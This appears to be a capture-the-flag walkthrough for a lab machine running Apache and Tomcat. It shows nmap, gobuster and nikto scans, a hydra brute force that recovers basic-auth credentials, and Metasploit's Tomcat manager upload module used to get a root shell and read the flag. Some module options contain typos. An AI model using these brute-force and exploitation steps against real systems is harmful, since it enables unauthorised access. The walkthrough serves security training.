
Scan all ports on the server
```
──(root㉿kali)-[~]
└─# nmap -p- 10.10.239.144 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-11 19:10 UTC
Nmap scan report for ip-10-10-239-144.eu-west-1.compute.internal (10.10.239.144)
Host is up (0.0049s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13
MAC Address: 02:97:4A:27:60:B7 (Unknown)

```

Scan open ports for version and common vulnerabilities
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4359f26bcb1a257a62b95ce9f1938d30 (RSA)
|   256 4c3cbc55e35ede41a020587471424eb6 (ECDSA)
|_  256 ea4ddadb5b720160f7bcb636f015d101 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

```


Enumerate url with gobuster
```
┌──(root㉿kali)-[~]
└─# gobuster dir -u  http://10.10.239.144 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.144
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2025/01/11 19:18:17 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/guidelines           (Status: 301) [Size: 319] [--> http://10.10.239.144/guidelines/]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
Progress: 19898 / 20470 (97.21%)===============================================================
2025/01/11 19:18:20 Finished
===============================================================
```

the guidelines directory has the message in the html text
```
**Hey bob, did you update that TomCat server? **
```

The other directory /protected has a basic authentication behind it
Using the hydra application we can enter in a username and enumerate a list of passwords to gain access to the directory
```
┌──(root㉿kali)-[~]
└─# hydra -l bob -P /usr/share/wordlists/rockyou.txt  10.10.239.144 http-get /protected
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-11 19:29:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.239.144:80/protected
[80][http-get] host: 10.10.239.144   login: bob   password: bubbles

```


Scan directory with the nikto application
```
┌──(root㉿kali)-[~]
└─# nikto -h 10.10.239.144 -p 1234 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.239.144
+ Target Hostname:    10.10.239.144
+ Target Port:        1234
+ Start Time:         2025-01-11 19:36:23 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found                                                                                                                                                                
+ /manager/status: Default Tomcat Server Status interface found                                                                                                                                                                            
+ 8195 requests: 0 error(s) and 13 item(s) reported on remote host                                                                                                                                                                         
+ End Time:           2025-01-11 19:36:35 (GMT0) (12 seconds)                                                                                                                                                                              
--------------------------------------------------------------------------- 
```
5 files were found under /manager/html

We can now exploit the vulnerable apache service using metasploit
set the httppassword used in basic authentication 
set the httpusername used in the basic authentication 
set the rport hosting the service 
set the rhost, the ip address of the target machine. 
finally exploit the machine
```
msfconsole 
search tomcat
use tomcat_mgr_upload
set httppassword bubbles
set httpusername bob
set rpport 1234 
set rhsots <target_ip>
exploit
```

Open a shell inside of the target machine
Run the whoami command to identify who the currently signed in user is
navigate to the root directory to output the contents of the flag.txt file
```
bash
whoami -> root
cd /root
ls -la -> flag.txt 
cat flag.txt
```